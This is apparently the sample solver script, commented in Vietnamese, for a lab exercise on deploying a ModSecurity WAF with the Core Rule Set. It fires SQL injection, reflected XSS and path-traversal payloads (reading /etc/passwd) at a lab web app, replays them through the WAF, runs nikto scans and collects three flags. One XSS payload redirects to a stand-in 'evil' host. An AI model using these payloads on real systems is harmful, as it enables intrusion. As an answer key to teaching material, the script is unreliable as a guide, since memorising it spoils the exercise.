#!/bin/bash
# =====================================================================
# solver.sh - LOI GIAI MAU dso-waf-crs (dung de tu kiem thu dat goal).
# Chay tren container client. Hoan toan offline (chi curl/nikto).
#
# Luu y ve kiem chung tu dong: solver chay tren client, KHONG the sua truc
# tiep file cau hinh cua container waf. Do do Nhiem vu 2 & 4 (v6n doi hoi
# sua cau hinh WAF) duoc dieu khien qua dich vu helper "wafctl" (waf:9091)
# - xem BUILD-NOTES. Sinh vien that su se tu sua cau hinh tren terminal waf.
# =====================================================================
set -u
WAF="waf"
WEBAPP="webapp"

echo "=== [Nhiem vu 1] exploit_direct: khai thac truc tiep webapp (khong qua WAF) ==="
echo "-- SQLi (minh hoa) --"
curl -s -i "http://$WEBAPP:8080/product?id=1'%20OR%20'1'='1" | head -5
echo "-- Reflected XSS --"
curl -s "http://$WEBAPP:8080/search?q=<script>alert(1)</script>" | head -3
echo "-- Path traversal doc /etc/passwd --"
curl -s "http://$WEBAPP:8080/download?file=../../../../etc/passwd" | head -3
echo "-- Path traversal doc flag1 --"
curl -s "http://$WEBAPP:8080/download?file=../../../../flag1.txt" | tr -d '\r' | awk 'NF {print $1; exit}' > ~/flag1.txt
echo "Flag 1 -> ~/flag1.txt: $(cat ~/flag1.txt)"

echo
echo "=== [Nhiem vu 2] deploy_waf: bat ModSecurity blocking + lay Flag 2 ==="
echo "-- Dua WAF ve che do chan (helper wafctl thay cho thao tac tay tren terminal waf) --"
curl -s -X POST "http://$WAF:9091/engine-on"
echo "-- Gui lai payload tan cong qua WAF, ky vong 403 --"
curl -s -o /dev/null -w "product(SQLi) qua WAF -> HTTP %{http_code}\n" "http://$WAF/product?id=1'%20OR%20'1'='1"
curl -s -o /dev/null -w "download(traversal) qua WAF -> HTTP %{http_code}\n" "http://$WAF/download?file=../../../../etc/passwd"
curl -s -o /dev/null -w "search(XSS) qua WAF -> HTTP %{http_code}\n" "http://$WAF/search?q=<script>alert(1)</script>"
echo "-- Lay Flag 2 (issuer tu kiem chung WAF dang chan) --"
curl -s "http://$WAF/flag2" | tr -d '\r' | awk 'NF {print $1; exit}' > ~/flag2.txt
echo "Flag 2 -> ~/flag2.txt: $(cat ~/flag2.txt)"

echo
echo "=== [Nhiem vu 3] dast_compare: quet DAST truoc/sau WAF ==="
echo "-- nikto truc tiep webapp --"
nikto -h "http://$WEBAPP:8080" -maxtime 120 -o ~/dast_noWAF.txt -Format txt 2>/dev/null || \
    nikto -h "http://$WEBAPP:8080" -o ~/dast_noWAF.txt -Format txt 2>/dev/null
echo "-- nikto qua WAF --"
nikto -h "http://$WAF" -maxtime 120 -o ~/dast_WAF.txt -Format txt 2>/dev/null || \
    nikto -h "http://$WAF" -o ~/dast_WAF.txt -Format txt 2>/dev/null
echo "So canh bao (dong '+ '): truc tiep=$(grep -c '^+ ' ~/dast_noWAF.txt) ; qua WAF=$(grep -c '^+ ' ~/dast_WAF.txt)"

echo
echo "=== [Nhiem vu 4] tune_falsepositive: khu false positive bang exclusion + Flag 3 ==="
echo "-- Tai hien false positive: /feedback hop le bi chan truoc khi co exclusion --"
curl -s -o /dev/null -w "feedback hop le (truoc exclusion) -> HTTP %{http_code}\n" \
    "http://$WAF/feedback?comment=Hay%20them%20nut%20UNION%20SELECT%20va%20ORDER%20BY%20price%20cho%20bang%20gia"
echo "-- Ap exclusion khoanh vung (helper wafctl thay cho sua tay crs-exclusions.conf) --"
curl -s -X POST "http://$WAF:9091/apply-exclusion"
echo "-- Xac nhan 2 dieu kien dong thoi --"
curl -s -o /dev/null -w "feedback hop le (sau exclusion) -> HTTP %{http_code}\n" \
    "http://$WAF/feedback?comment=Hay%20them%20nut%20UNION%20SELECT%20va%20ORDER%20BY%20price%20cho%20bang%20gia"
curl -s -o /dev/null -w "SQLi /product (van phai bi chan) -> HTTP %{http_code}\n" \
    "http://$WAF/product?id=1'%20OR%20'1'='1"
curl -s -o /dev/null -w "XSS that /feedback (van phai bi chan) -> HTTP %{http_code}\n" \
    "http://$WAF/feedback?comment=%3Cscript%3Edocument.location%3D%27http://evil%27%3C/script%3E"
echo "-- Lay Flag 3 --"
curl -s "http://$WAF/flag3" | tr -d '\r' | awk 'NF {print $1; exit}' > ~/flag3.txt
echo "Flag 3 -> ~/flag3.txt: $(cat ~/flag3.txt)"

echo
echo "=== HOAN TAT solver.sh ==="
echo "Artifact: ~/flag1.txt ~/flag2.txt ~/flag3.txt ~/dast_noWAF.txt ~/dast_WAF.txt"
